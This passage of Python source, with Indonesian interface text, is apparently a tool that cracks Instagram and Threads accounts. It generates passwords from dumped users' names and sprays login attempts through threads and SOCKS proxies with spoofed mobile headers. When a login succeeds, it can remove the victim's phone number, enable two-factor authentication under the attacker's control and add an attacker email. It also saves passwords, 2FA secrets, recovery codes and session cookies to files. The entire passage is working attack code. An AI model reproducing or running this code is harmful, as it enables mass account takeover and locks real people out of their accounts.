                self.amankan_akun.append('ya')
            self.Exec_Methode(Methode_Login)
        except (Exception) as e:
            Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic red]{str(e).title()}!"", title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (Error) [bold green]<[bold yellow]<[bold red]<""))
            exit()                
        
    def Simpan_Result(self):
        self.waktu = datetime.datetime.now()
        self.bulan = ['Januari', 'Februari', 'Maret', 'April',  'Mei', 'Juni', 'Juli','Agustus', 'September', 'Oktober', 'November', 'Desember']
        return(f'OK-{self.waktu.day}-{self.bulan[self.waktu.month-1]}-{self.waktu.year}', f'2F-{self.waktu.day}-{self.bulan[self.waktu.month-1]}-{self.waktu.year}',f'CP-{self.waktu.day}-{self.bulan[self.waktu.month-1]}-{self.waktu.year}')
        
    def Password(self, fullname):
        self.one = []
        for nama in fullname.split(' '):
            nama = nama.lower()
            if len(nama) <3: continue
            elif len(nama) == 3 or len(nama) == 4 or len(nama) == 5: self.one.append(fullname.lower()); self.one.append(fullname.replace(' ','')); self.one.append(nama+'123'); self.one.append(nama+'1234'); self.one.append(nama+'12345')
            else: self.one.append(fullname.lower()); self.one.append(fullname.replace(' ','')); self.one.append(nama+'123'); self.one.append(nama+'1234'); self.one.append(nama+'12345')
        
    def Exec_Methode(self, Methode_Login):
        try:
            self.result_ok,self.result_two,self.result_cp = self.Simpan_Result()
            Console(width = 65, style = ""bold grey50"").print(Panel(f""[bold green]•[bold white] Result OK Tersimpan Di Folder : [bold green]/sdcard/OK/{self.result_ok}\n[bold red]•[bold white] Result 2F Tersimpan Di Folder : [bold red]/sdcard/2F/{self.result_two}\n[bold green]•[bold white] Result CP Tersimpan Di Folder : [bold yellow]/sdcard/CP/{self.result_cp}"", title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (Result Instagram) [bold green]<[bold yellow]<[bold red]<""))
            Console(width = 65).print(Panel('[bold white]Mainkan Mode Pesawat Setiap 200 Looping Agar Terhindar Spam!',title='[bold red]>[bold yellow]>[bold green]>[bold grey50] (Warning Spam) [bold green]<[bold yellow]<[bold red]<',style='white'))
            with ThreadPoolExecutor(max_workers=30) as V:
                for Username_And_Fullname in dump:
                    username, fullname = Username_And_Fullname.split('<=>')
                    password = self.Password(fullname)
                    if Methode_Login in ('1'):
                        V.submit(self.ExecApi, username,password)
                    elif Methode_Login in ('2'):
                        V.submit(self.ExecApi_Threads, username,password)
                    elif Methode_Login in ('3'):
                        V.submit(self.ExecAjax, username,password)
                    elif Methode_Login in ('4'):
                        V.submit(self.ExecAjax_Threads, username,password)
                    else: V.submit(self.ExecApi, username,password)
            Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic white]Selamat Kamu Telah Mendapatkan [bold green]{self.success}[bold white] Hasil OK, [bold yellow]{self.chekpoint}[bold white] Hasil Checkpoint Dan [bold red]{self.faktor}[bold white] Hasil Two Faktor, Dari {len(dump)} Username!"", title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (Selesai) [bold green]<[bold yellow]<[bold red]<""))
            exit()
        except (Exception) as e:
            Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic red]{str(e).title()}!"", title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (Error) [bold green]<[bold yellow]<[bold red]<""))
            exit()  
        
    def ExecApi(self, username, password):
        byps = requests.Session()
        try: Console().print(f""[bold grey50]   ──>[bold white] Crack[bold green] {str(username)[:15]}[bold grey50]/[bold white]{'{:.0%}'.format(self.looping/float(len(dump)))}[bold grey50]/[bold white]{str(len(dump))}[bold grey50]/[bold white]{self.looping}[bold grey50]/[bold white] OK:-[bold green]{self.success}[bold white] CP:-[bold red]{self.chekpoint}[bold white] 2F:-[bold red]{self.faktor}[bold white]     "", end='\r')
        except (ZeroDivisionError) as e:
            Console().print(f""[bold grey50]   ──>[bold red] {str(e).upper()}!"", end='\r')
            time.sleep(3.5)
        while True:
            try:
                data = {'signed_body': '7b589ee94c17a18ac2ea9a5247069f1d5f631ba9a37fae36429f10be5dddccfa.{""id"":""{str(str(uuid.uuid4()))}"",""server_config_retrieval"":""1"",""experiments"": ""ig_android_account_switching,ig_android_upsell_fullname,ig_android_one_click_in_old_flow,ig_android_landing_page_fb_button,ig_fbns_push,ig_android_split_username_reg,ig_android_separate_avatar_upload,ig_android_contact_point_triage,ig_fbns_blocked,ig_android_re_enable_login_button,ig_android_phone_tab_on_left""}','ig_sig_key_version': '4'}
                curl = byps.get('https://i.instagram.com/api/v1/qe/sync/', data = data, allow_redirects=True)
                headers = {
                    'x-ig-bandwidth-totalbytes-b': str(random.randint(5000000, 90000000)),
                    'x-ig-app-locale': 'in_ID',
                    'x-ig-bandwidth-speed-kbps': str(random.randint(2500000, 3000000) / 1000),
                    'x-ig-device-locale': 'in_ID',
                    'x-ig-mapped-locale': 'id_ID',
                    'x-pigeon-rawclienttime': '{:.6f}'.format(time.time()),
                    'x-ig-bandwidth-totaltime-ms': str(random.randint(2000, 9000)),
                    'x-bloks-version-id': '8ca96ca267e30c02cf90888d91eeff09627f0e3fd2bd9df472278c9a6c022cbb',
                    'x-ig-timezone-offset': str(-time.timezone),
                    'x-ig-connection-type': 'MOBILE(LTE)',
                    'x-ig-capabilities': random.choice(['Fw==','3brTv10=','3brTvw8=','3brTvwM=']),
                    'x-pigeon-session-id': f'UFS-{str(uuid.uuid4())}-0',
                    'x-ig-app-id': '567067343352427',
                    'priority': 'u=3',
                    'user-agent': Useragent().useragent_api(),
                    'accept-language': 'id-ID, en-US',
                    'x-bloks-is-layout-rtl': 'false',
                    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                    'Host': 'i.instagram.com',
                    'x-fb-http-engine': 'Liger',
                    'x-fb-client-ip': 'True',
                    'x-fb-server-cluster': 'True',
                    'x-fb-connection-type': 'MOBILE.LTE',
                    'connection': 'keep-alive',
                    'cookie': ("";"").join([ ""%s=%s"" % (key, value) for key, value in byps.cookies.get_dict().items() ])
                }
                break
            except (requests.exceptions.ConnectionError):
                Console().print(f""[bold grey50]   ──>[bold red] KONEKSI ERROR!"", end='\r')
                time.sleep(5)
                self.ExecApi(username, password)
            except (Exception) as e:
                Console().print(f""[bold grey50]   ──>[bold red] {str(e).upper()}!"", end='\r')
                time.sleep(3.5)
                self.ExecApi(username, password)
        for passwd in password:
            try:
                hash = hashlib.md5()
                hash.update(username.encode('utf-8') + passwd.encode('utf-8'))
                hex_ = hash.hexdigest()
                hash.update(hex_.encode('utf-8') + '12345'.encode('utf-8'))          
                payload = json.dumps({
                    'phone_id': str(uuid.uuid4()),
                    '_csrftoken': curl.cookies.get('csrftoken',None),
                    'username': username,
                    'guid': str(uuid.uuid4()),
                    'device_id': 'android-'+str(uuid.uuid4()),
                    'enc_password': Requre().enc_password(passwd),
                    'login_attempt_count': '0',
                    }
                )    
                encode = (f'signed_body=7b589ee94c17a18ac2ea9a5247069f1d5f631ba9a37fae36429f10be5dddccfa.'+urllib.parse.quote(payload)+'&ig_sig_key_version=4')
                proxs = {'http': 'socks5://'+random.choice(Requ().Socksku())}
                response = byps.post('https://i.instagram.com/api/v1/accounts/login/', data = encode, headers = headers, proxies = proxs, allow_redirects=True).text
                self.result_ok, self.result_two, self.result_cp = self.Simpan_Result()
                if 'logged_in_user' in str(response):
                    self.success+=1
                    try: cookie = (';'.join(['%s=%s'%(name, value) for name, value in byps.cookies.get_dict().items()]))
                    except (Exception) as e: cookie = (None)
                    try: fullname, follower, followed, feedpost = Requ().Validasi_Username(username)
                    except (UnboundLocalError) as e: pass
                    if 'ya' in self.amankan_akun:
                        try:
                            #RePassd  = Require().RePassword(passwd, ''.join(str(random.choice('abcdefghij@kdddez_-sess_-trrffrdd')) for i in range(8)), cookie)
                            #OnRd = f'{passwd}' if RePassd is None else f'{RePassd}'
                            num = Require().DeltPhone(cookie)
                            statp, pone = num['Dihapus'], num['Number']
                            deleted = f'{pone} Di Hapus' if statp is True else f'{pone} Tidak Di Hapus'
                            two = Require().Aktifkan2F(cookie)
                            kode, key, statf = two['kode-pemulihan'], two['SecretKey'], two['success-a2f']
                            stat2fa = 'Di Aktifkan' if statf is not False else 'Tidak Aktif'
                            Temp = Require().AddMail(cookie)
                            email, state, inbx = Temp['email'], Temp['di-konfirmasi'], Temp['Url']
                            statd = 'Di Konfirmasi' if state is True else 'Tidak Di Konfirmasi'
                            tree = Tree(f'\r╭ logged in user',style='green')
                            true = tree.add(f'Succes logged {fullname}')
                            true.add(f'Username {username}')
                            true.add(f'Password {passwd}')
                            true = tree.add(f'\r╭ informasi profiles',style='green')
                            true.add(f'Followers {follower}')
                            true.add(f'Following {followed}')
                            true.add(f'Postingan {feedpost}')
                            true = tree.add(f'\r╭ auth secure account',style='green')
                            true.add(f'stats two {stat2fa}')
                            true.add(f'screetkey {key}')
                            true.add(f'pemulihan {kode}')  
                            true.add(f'telephone {deleted}')   
                            true.add(f'add email {email} {statd}')
                            true.add(f'web email {inbx}')
                            tree.add(f'Cookie {cookie}')
                            printz(tree)
                            save = f'{fullname}|{username}|{passwd}|{follower}|{followed}|{feedpost}|{stat2fa}|{key}|{kode}|{deleted}|{email} {statd}|{inbx}|{cookie}\n'
                        except Exception as e:
                            print(e)
                            tree = Tree(f'\r╭ logged in user',style='green')
                            true = tree.add(f'Succes logged {fullname}')
                            true.add(f'Username {username}')
                            true.add(f'Password {passwd}')
                            true = tree.add(f'\r╭ informasi profiles',style='green')
                            true.add(f'Followers {follower}')
                            true.add(f'Following {followed}')
                            true.add(f'Postingan {feedpost}')
                            tree.add(f'Cookie {cookie}')
                            printz(tree)
                            save = f'{fullname}|{username}|{passwd}|{follower}|{followed}|{feedpost}|{cookie}\n'
                    else:
                        tree = Tree(f'\r╭ logged in user',style='green')
                        true = tree.add(f'Succes logged {fullname}')
                        true.add(f'Username {username}')
                        true.add(f'Password {passwd}')
                        true = tree.add(f'\r╭ informasi profiles',style='green')
                        true.add(f'Followers {follower}')
                        true.add(f'Following {followed}')
                        true.add(f'Postingan {feedpost}')
                        tree.add(f'Cookie {cookie}')
                        printz(tree)
                        save = f'{fullname}|{username}|{passwd}|{follower}|{followed}|{feedpost}|{cookie}\n'
                    with open('/sdcard/OK/'+self.result_ok,'a') as wr:
                        wr.write(save)
                        wr.close()
                    break       
                elif 'two_factor_required' in str(response):
                    try: fullname, follower, followed, feedpost = Requ().Validasi_Username(username)
                    except (UnboundLocalError) as e: pass
                    tree = Tree('\r╭ logged two factor                ',style='red')
                    true = tree.add(f'Gagal logged {fullname}')
                    true.add(f'Username {username}')
                    true.add(f'Password {passwd}')
                    true = tree.add(f'\r╭ informasi profiles',style='red')
                    true.add(f'Followers {follower}')
                    true.add(f'Following {followed}')
                    true.add(f'Postingan {feedpost}')
                    printz(tree)
                    save = f'{fullname}|{username}|{passwd}|{follower}|{followed}|{feedpost}\n'
                    self.faktor+=1
                    with open('/sdcard/2F/'+self.result_two,'a') as wr:
                        wr.write(save)
                        wr.close()   
                    break 
                elif 'https://i.instagram.com/challenge/' in str(response):
                    try: fullname, follower, followed, feedpost = Requ().Validasi_Username(username)
                    except (UnboundLocalError) as e: pass
                    tree = Tree('\r╭ logged challenge                ',style='yellow')
                    true = tree.add(f'Gagal logged {fullname}')
                    true.add(f'Username {username}')
                    true.add(f'Password {passwd}')
                    true = tree.add(f'\r╭ informasi profiles',style='yellow')
                    true.add(f'Followers {follower}')
                    true.add(f'Following {followed}')
                    true.add(f'Postingan {feedpost}')
                    printz(tree)
                    save = f'{fullname}|{username}|{passwd}|{follower}|{followed}|{feedpost}\n'
                    self.chekpoint+=1
                    with open('/sdcard/CP/'+self.result_cp,'a') as wr:
                        wr.write(save)
                        wr.close()
                    break    
                elif 'ip_block' in str(response):
                    Console().print(f""[bold grey50]   ──>[bold red] HIDUPKAN MODE PESAWAT 5 DETIK!"", end='\r')
                    time.sleep(3.5)     
                else:
                    continue   
            except (KeyboardInterrupt, requests.exceptions.ConnectionError, requests.exceptions.TooManyRedirects):
                Console().print(f""[bold grey50]   ──>[bold red] KONEKSI ERROR!"", end='\r')
                time.sleep(31)
                self.ExecApi(username, password)
        self.looping+=1
        
    def ExecApi_Threads(self, username, password):
        byps = requests.Session()
        try: Console().print(f""[bold grey50]   ──>[bold white] Crack[bold green] {str(username)[:15]}[bold grey50]/[bold white]{'{:.0%}'.format(self.looping/float(len(dump)))}[bold grey50]/[bold white]{str(len(dump))}[bold grey50]/[bold white]{self.looping}[bold grey50]/[bold white] OK:-[bold green]{self.success}[bold white] CP:-[bold red]{self.chekpoint}[bold white] 2F:-[bold red]{self.faktor}[bold white]     "", end='\r')
        except (ZeroDivisionError) as e:
            Console().print(f""[bold grey50]   ──>[bold red] {str(e).upper()}!"", end='\r')
            time.sleep(3.5)
        while True:
            try:
                data = {'signed_body': '7b589ee94c17a18ac2ea9a5247069f1d5f631ba9a37fae36429f10be5dddccfa.{""id"":""{str(str(uuid.uuid4()))}"",""server_config_retrieval"":""1"",""experiments"": ""ig_android_account_switching,ig_android_upsell_fullname,ig_android_one_click_in_old_flow,ig_android_landing_page_fb_button,ig_fbns_push,ig_android_split_username_reg,ig_android_separate_avatar_upload,ig_android_contact_point_triage,ig_fbns_blocked,ig_android_re_enable_login_button,ig_android_phone_tab_on_left""}','ig_sig_key_version': '4'}
                curl = byps.get('https://www.threads.net/api/v1/qe/sync/', data = data, allow_redirects=True)
                headers = {
                    'x-ig-bandwidth-totalbytes-b': str(random.randint(5000000, 90000000)),
                    'x-ig-app-locale': 'in_ID',
                    'x-ig-bandwidth-speed-kbps': str(random.randint(2500000, 3000000) / 1000),
                    'x-ig-device-locale': 'in_ID',
                    'x-ig-mapped-locale': 'id_ID',
                    'x-pigeon-rawclienttime': '{:.6f}'.format(time.time()),
                    'x-ig-bandwidth-totaltime-ms': str(random.randint(2000, 9000)),
                    'x-bloks-version-id': '5f56efad68e1edec7801f630b5c122704ec5378adbee6609a448f105f34a9c73',
                    'x-ig-timezone-offset': str(-time.timezone),
                    'x-ig-connection-type': 'MOBILE(LTE)',
                    'x-ig-capabilities': random.choice(['Fw==','3brTv10=','3brTvw8=','3brTvwM=']),
                    'x-pigeon-session-id': f'UFS-{str(uuid.uuid4())}-0',
                    'x-ig-app-id': '567067343352427',
                    'priority': 'u=3',
                    'user-agent': Useragent().useragent_api(),
                    'accept-language': 'id-ID, en-US',
                    'x-bloks-is-layout-rtl': 'false',
                    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                    'Host': 'www.instagram.com',
                    'x-fb-http-engine': 'Liger',
                    'x-fb-client-ip': 'True',
                    'x-fb-server-cluster': 'True',
                    'x-fb-connection-type': 'MOBILE.LTE',
                    'connection': 'keep-alive',
                    'cookie': ("";"").join([ ""%s=%s"" % (key, value) for key, value in byps.cookies.get_dict().items() ])
                }
                break
            except (requests.exceptions.ConnectionError):
                Console().print(f""[bold grey50]   ──>[bold red] KONEKSI ERROR!"", end='\r')
                time.sleep(5)
                self.ExecApi(username, password)
            except (Exception) as e:
                Console().print(f""[bold grey50]   ──>[bold red] {str(e).upper()}!"", end='\r')
                time.sleep(3.5)
                self.ExecApi_Threads(username, password)
        for passwd in password:
            try:
                hash = hashlib.md5()
                hash.update(username.encode('utf-8') + passwd.encode('utf-8'))
                hex_ = hash.hexdigest()
                hash.update(hex_.encode('utf-8') + '12345'.encode('utf-8'))          
                payload = json.dumps({
                    'phone_id': str(uuid.uuid4()),
                    '_csrftoken': curl.cookies.get('csrftoken',None),
                    'username': username,
                    'guid': str(uuid.uuid4()),
                    'device_id': 'android-'+str(uuid.uuid4()),
                    'enc_password': Requre().enc_password(passwd),
                    'login_attempt_count': '0',
                    }
                )    
                encode = (f'signed_body=7b589ee94c17a18ac2ea9a5247069f1d5f631ba9a37fae36429f10be5dddccfa.'+urllib.parse.quote(payload)+'&ig_sig_key_version=4')
                proxs = {'http': 'socks5://'+random.choice(Requ().Socksku())}
                response = byps.post('https://www.threads.net/api/v1/accounts/login/', data = encode, headers = headers, proxies = proxs, allow_redirects=True).text
                self.result_ok, self.result_two, self.result_cp = self.Simpan_Result()
                if 'logged_in_user' in str(response):
                    self.success+=1
                    try: cookie = (';'.join(['%s=%s'%(name, value) for name, value in byps.cookies.get_dict().items()]))
                    except (Exception) as e: cookie = (None)
                    try: fullname, follower, followed, feedpost = Requ().Validasi_Username(username)
                    except (UnboundLocalError) as e: pass
                    if 'ya' in self.amankan_akun:
                        try:
                            #RePassd  = Require().RePassword(passwd, ''.join(str(random.choice('abcdefghij@kdddez_-sess_-trrffrdd')) for i in range(8)), cookie)
                            #OnRd = f'{passwd}' if RePassd is None else f'{RePassd}'
                            num = Require().DeltPhone(cookie)
                            statp, pone = num['Dihapus'], num['Number']
                            deleted = f'{pone} Di Hapus' if statp is True else f'{pone} Tidak Di Hapus'
                            two = Require().Aktifkan2F(cookie)
                            kode, key, statf = two['kode-pemulihan'], two['SecretKey'], two['success-a2f']
                            stat2fa = 'Di Aktifkan' if statf is not False else 'Tidak Aktif'
                            Temp = Require().AddMail(cookie)
                            email, state, inbx = Temp['email'], Temp['di-konfirmasi'], Temp['Url']
                            statd = 'Di Konfirmasi' if state is True else 'Tidak Di Konfirmasi'
                            tree = Tree(f'\r╭ logged in user',style='green')
                            true = tree.add(f'Succes logged {fullname}')
                            true.add(f'Username {username}')
                            true.add(f'Password {passwd}')
                            true = tree.add(f'\r╭ informasi profiles',style='green')
                            true.add(f'Followers {follower}')
                            true.add(f'Following {followed}')
                            true.add(f'Postingan {feedpost}')
                            true = tree.add(f'\r╭ auth secure account',style='green')
                            true.add(f'stats two {stat2fa}')
                            true.add(f'screetkey {key}')
                            true.add(f'pemulihan {kode}')  
                            true.add(f'telephone {deleted}')   
                            true.add(f'add email {email} {statd}')
                            true.add(f'web email {inbx}')
                            tree.add(f'Cookie {cookie}')
                            printz(tree)
                            save = f'{fullname}|{username}|{passwd}|{follower}|{followed}|{feedpost}|{stat2fa}|{key}|{kode}|{deleted}|{email} {statd}|{inbx}|{cookie}\n'
                        except Exception as e:
                            print(e)
                            tree = Tree(f'\r╭ logged in user',style='green')
                            true = tree.add(f'Succes logged {fullname}')
                            true.add(f'Username {username}')
                            true.add(f'Password {passwd}')
                            true = tree.add(f'\r╭ informasi profiles',style='green')
                            true.add(f'Followers {follower}')
                            true.add(f'Following {followed}')
                            true.add(f'Postingan {feedpost}')
                            tree.add(f'Cookie {cookie}')
                            printz(tree)
                            save = f'{fullname}|{username}|{passwd}|{follower}|{followed}|{feedpost}|{cookie}\n'
                    else:
                        tree = Tree(f'\r╭ logged in user',style='green')
                        true = tree.add(f'Succes logged {fullname}')
                        true.add(f'Username {username}')
                        true.add(f'Password {passwd}')
                        true = tree.add(f'\r╭ informasi profiles',style='green')
                        true.add(f'Followers {follower}')
                        true.add(f'Following {followed}')
                        true.add(f'Postingan {feedpost}')
                        tree.add(f'Cookie {cookie}')
                        printz(tree)
                        save = f'{fullname}|{username}|{passwd}|{follower}|{followed}|{feedpost}|{cookie}\n'
                    with open('/sdcard/OK/'+self.result_ok,'a') as wr:
                        wr.write(save)
                        wr.close()
                    break       
                elif 'two_factor_required' in str(response):
                    try: fullname, follower, followed, feedpost = Requ().Validasi_Username(username)
                    except (UnboundLocalError) as e: pass
                    tree = Tree('\r╭ logged two factor                ',style='red')
                    true = tree.add(f'Gagal logged {fullname}')
                    true.add(f'Username {username}')
                    true.add(f'Password {passwd}')
                    true = tree.add(f'\r╭ informasi profiles',style='red')
                    true.add(f'Followers {follower}')
                    true.add(f'Following {followed}')
                    true.add(f'Postingan {feedpost}')
                    printz(tree)
                    save = f'{fullname}|{username}|{passwd}|{follower}|{followed}|{feedpost}\n'
                    self.faktor+=1
                    with open('/sdcard/2F/'+self.result_two,'a') as wr:
                        wr.write(save)
                        wr.close()   
                    break 
                elif 'https://i.instagram.com/challenge/' in str(response):
                    try: fullname, follower, followed, feedpost = Requ().Validasi_Username(username)
                    except (UnboundLocalError) as e: pass
                    tree = Tree('\r╭ logged challenge                ',style='yellow')
                    true = tree.add(f'Gagal logged {fullname}')
                    true.add(f'Username {username}')
                    true.add(f'Password {passwd}')
                    true = tree.add(f'\r╭ informasi profiles',style='yellow')
                    true.add(f'Followers {follower}')
                    true.add(f'Following {followed}')
                    true.add(f'Postingan {feedpost}')
                    printz(tree)
                    save = f'{fullname}|{username}|{passwd}|{follower}|{followed}|{feedpost}\n'
                    self.chekpoint+=1
                    with open('/sdcard/CP/'+self.result_cp,'a') as wr:
                        wr.write(save)
                        wr.close()
                    break   
                elif 'ip_block' in str(response):
                    Console().print(f""[bold grey50]   ──>[bold red] HIDUPKAN MODE PESAWAT 5 DETIK!"", end='\r')
                    time.sleep(3.5)                  
                else:
                    continue   
            except (KeyboardInterrupt, requests.exceptions.ConnectionError, requests.exceptions.TooManyRedirects):
                Console().print(f""[bold grey50]   ──>[bold red] KONEKSI ERROR!"", end='\r')
                time.sleep(31)
                self.ExecApi_Threads(username, password)
        self.looping+=1
            
    def ExecAjax(self, username, password):
        byps = requests.Session()
        try: Console().print(f""[bold grey50]   ──>[bold white] Crack[bold green] {str(username)[:15]}[bold grey50]/[bold white]{'{:.0%}'.format(self.looping/float(len(dump)))}[bold grey50]/[bold white]{str(len(dump))}[bold grey50]/[bold white]{self.looping}[bold grey50]/[bold white] OK:-[bold green]{self.success}[bold white] CP:-[bold red]{self.chekpoint}[bold white] 2F:-[bold red]{self.faktor}[bold white]     "", end='\r')
        except (ZeroDivisionError) as e:
            Console().print(f""[bold grey50]   ──>[bold red] {str(e).upper()}!"", end='\r')
            time.sleep(3.5)
        while True:
            try:
                curl = byps.get('https://www.instagram.com/accounts/onetap/?next=%2F&hl=en', allow_redirects=True)
                headers = {
                    'Host': 'www.instagram.com',
                    'content-length': str(random.randint(2000,2999)),
                    'x-ig-app-id': '1217981644879628',
                    'x-instagram-ajax': '1011794706',
                    'user-agent': Useragent().useragent_ajax(),
                    'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
                    'x-asbd-id': '129477',
                    'dpr': '2',
                    'x-csrftoken': curl.cookies.get('csrftoken',None),
                    'accept': '*/*',
                    'origin': 'https://www.instagram.com',
                    'sec-fetch-site': 'same-origin',
                    'sec-fetch-mode': 'navigate',
                    'sec-fetch-dest': 'document',
                    'referer': 'https://www.instagram.com/?hl=en',
                    'accept-encoding': 'gzip, deflate',
                    'accept-language': 'en-US;q=0.8,en;q=0.9'
                }
                break
            except (requests.exceptions.ConnectionError):
                Console().print(f""[bold grey50]   ──>[bold red] KONEKSI ERROR!"", end='\r')
                time.sleep(5)
                self.ExecApi(username, password)
            except (Exception) as e:
                Console().print(f""[bold grey50]   ──>[bold red] {str(e).upper()}!"", end='\r')
                time.sleep(3.5)
                self.ExecAjax(username, password)
        for passwd in password:
            try:          
                payload = {
                    'enc_password': Requre().enc_password(passwd),
                    'optIntoOneTap':'false',
                    'queryParams':json.dumps({""hl"":""en""}),
                    'trustedDeviceRecords':'{}',
                    'username': username,
                }
                proxs = {'http': 'socks5://'+random.choice(Requ().Socksku())}
                response = byps.post('https://www.instagram.com/api/v1/web/accounts/login/ajax/', data = payload, headers = headers, proxies = proxs, allow_redirects=True).text
                self.result_ok, self.result_two, self.result_cp = self.Simpan_Result()
                if 'userId' in str(response):
                    self.success+=1
                    try: cookie = (';'.join(['%s=%s'%(name, value) for name, value in byps.cookies.get_dict().items()]))
                    except (Exception) as e: cookie = (None)
                    try: fullname, follower, followed, feedpost = Requ().Validasi_Username(username)
                    except (UnboundLocalError) as e: pass
                    if 'ya' in self.amankan_akun:
                        try:
                            #RePassd  = Require().RePassword(passwd, ''.join(str(random.choice('abcdefghij@kdddez_-sess_-trrffrdd')) for i in range(8)), cookie)
                            #OnRd = f'{passwd}' if RePassd is None else f'{RePassd}'
                            num = Require().DeltPhone(cookie)
                            statp, pone = num['Dihapus'], num['Number']
                            deleted = f'{pone} Di Hapus' if statp is True else f'{pone} Tidak Di Hapus'
                            two = Require().Aktifkan2F(cookie)
                            kode, key, statf = two['kode-pemulihan'], two['SecretKey'], two['success-a2f']
                            stat2fa = 'Di Aktifkan' if statf is not False else 'Tidak Aktif'
                            Temp = Require().AddMail(cookie)
                            email, state, inbx = Temp['email'], Temp['di-konfirmasi'], Temp['Url']
                            statd = 'Di Konfirmasi' if state is True else 'Tidak Di Konfirmasi'
                            tree = Tree(f'\r╭ logged in user',style='green')
                            true = tree.add(f'Succes logged {fullname}')
                            true.add(f'Username {username}')
                            true.add(f'Password {passwd}')
                            true = tree.add(f'\r╭ informasi profiles',style='green')
                            true.add(f'Followers {follower}')
                            true.add(f'Following {followed}')
                            true.add(f'Postingan {feedpost}')
                            true = tree.add(f'\r╭ auth secure account',style='green')
                            true.add(f'stats two {stat2fa}')
                            true.add(f'screetkey {key}')
                            true.add(f'pemulihan {kode}')  
                            true.add(f'telephone {deleted}')   
                            true.add(f'add email {email} {statd}')
                            true.add(f'web email {inbx}')
                            tree.add(f'Cookie {cookie}')
                            printz(tree)
                            save = f'{fullname}|{username}|{passwd}|{follower}|{followed}|{feedpost}|{stat2fa}|{key}|{kode}|{deleted}|{email} {statd}|{inbx}|{cookie}\n'
                        except Exception as e:
                            print(e)
                            tree = Tree(f'\r╭ logged in user',style='green')
                            true = tree.add(f'Succes logged {fullname}')
                            true.add(f'Username {username}')
                            true.add(f'Password {passwd}')
                            true = tree.add(f'\r╭ informasi profiles',style='green')
                            true.add(f'Followers {follower}')
                            true.add(f'Following {followed}')
                            true.add(f'Postingan {feedpost}')
                            tree.add(f'Cookie {cookie}')
                            printz(tree)
                            save = f'{fullname}|{username}|{passwd}|{follower}|{followed}|{feedpost}|{cookie}\n'
                    else:
                        tree = Tree(f'\r╭ logged in user',style='green')
                        true = tree.add(f'Succes logged {fullname}')
                        true.add(f'Username {username}')
                        true.add(f'Password {passwd}')
                        true = tree.add(f'\r╭ informasi profiles',style='green')
                        true.add(f'Followers {follower}')
                        true.add(f'Following {followed}')
                        true.add(f'Postingan {feedpost}')
                        tree.add(f'Cookie {cookie}')
                        printz(tree)
                        save = f'{fullname}|{username}|{passwd}|{follower}|{followed}|{feedpost}|{cookie}\n'
                    with open('/sdcard/OK/'+self.result_ok,'a') as wr:
                        wr.write(save)
                        wr.close()
                    break       
                elif 'two_factor_required' in str(response):
                    try: fullname, follower, followed, feedpost = Requ().Validasi_Username(username)
                    except (UnboundLocalError) as e: pass
                    tree = Tree('\r╭ logged two factor                ',style='red')
                    true = tree.add(f'Gagal logged {fullname}')
                    true.add(f'Username {username}')
                    true.add(f'Password {passwd}')
                    true = tree.add(f'\r╭ informasi profiles',style='red')
                    true.add(f'Followers {follower}')
                    true.add(f'Following {followed}')
                    true.add(f'Postingan {feedpost}')
                    printz(tree)
                    save = f'{fullname}|{username}|{passwd}|{follower}|{followed}|{feedpost}\n'
                    self.faktor+=1
                    with open('/sdcard/2F/'+self.result_two,'a') as wr:
                        wr.write(save)
                        wr.close()   
                    break 
                elif 'https://i.instagram.com/challenge/' in str(response):
                    try: fullname, follower, followed, feedpost = Requ().Validasi_Username(username)
                    except (UnboundLocalError) as e: pass
                    tree = Tree('\r╭ logged challenge                ',style='yellow')
                    true = tree.add(f'Gagal logged {fullname}')
                    true.add(f'Username {username}')
                    true.add(f'Password {passwd}')
                    true = tree.add(f'\r╭ informasi profiles',style='yellow')
                    true.add(f'Followers {follower}')
                    true.add(f'Following {followed}')
                    true.add(f'Postingan {feedpost}')
                    printz(tree)
                    save = f'{fullname}|{username}|{passwd}|{follower}|{followed}|{feedpost}\n'
                    self.chekpoint+=1
                    with open('/sdcard/CP/'+self.result_cp,'a') as wr:
                        wr.write(save)
                        wr.close()
                    break    
                elif 'ip_block' in str(response):
                    Console().print(f""[bold grey50]   ──>[bold red] HIDUPKAN MODE PESAWAT 5 DETIK!"", end='\r')
                    time.sleep(3.5)     
                else:
                    continue   
            except (KeyboardInterrupt, requests.exceptions.ConnectionError, requests.exceptions.TooManyRedirects):
                Console().print(f""[bold grey50]   ──>[bold red] KONEKSI ERROR!"", end='\r')
                time.sleep(31)
                self.ExecAjax(username, password)
        self.looping+=1
        
    def ExecAjax_Threads(self, username, password):
        byps = requests.Session()
        try: Console().print(f""[bold grey50]   ──>[bold white] Crack[bold green] {str(username)[:15]}[bold grey50]/[bold white]{'{:.0%}'.format(self.looping/float(len(dump)))}[bold grey50]/[bold white]{str(len(dump))}[bold grey50]/[bold white]{self.looping}[bold grey50]/[bold white] OK:-[bold green]{self.success}[bold white] CP:-[bold red]{self.chekpoint}[bold white] 2F:-[bold red]{self.faktor}[bold white]     "", end='\r')
        except (ZeroDivisionError) as e:
            Console().print(f""[bold grey50]   ──>[bold red] {str(e).upper()}!"", end='\r')
            time.sleep(3.5)
        while True:
            try:
                curl = byps.get('https://www.threads.net/accounts/onetap/?next=%2F&hl=en', allow_redirects=True)
                headers = {
                    'Host': 'www.instagram.com',
                    'content-length': str(random.randint(2000,2999)),
                    'x-ig-app-id': '1217981644879628',
                    'x-instagram-ajax': '1011794706',
                    'user-agent': Useragent().useragent_ajax(),
                    'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
                    'x-asbd-id': '129477',
                    'dpr': '2',
                    'x-csrftoken': curl.cookies.get('csrftoken',None),
                    'accept': '*/*',
                    'origin': 'https://www.threads.net',
                    'sec-fetch-site': 'same-origin',
                    'sec-fetch-mode': 'navigate',
                    'sec-fetch-dest': 'document',
                    'referer': 'https://www.threads.net/?hl=en',
                    'accept-encoding': 'gzip, deflate',
                    'accept-language': 'en-US;q=0.8,en;q=0.9'
                }
                break
            except (requests.exceptions.ConnectionError):
                Console().print(f""[bold grey50]   ──>[bold red] KONEKSI ERROR!"", end='\r')
                time.sleep(5)
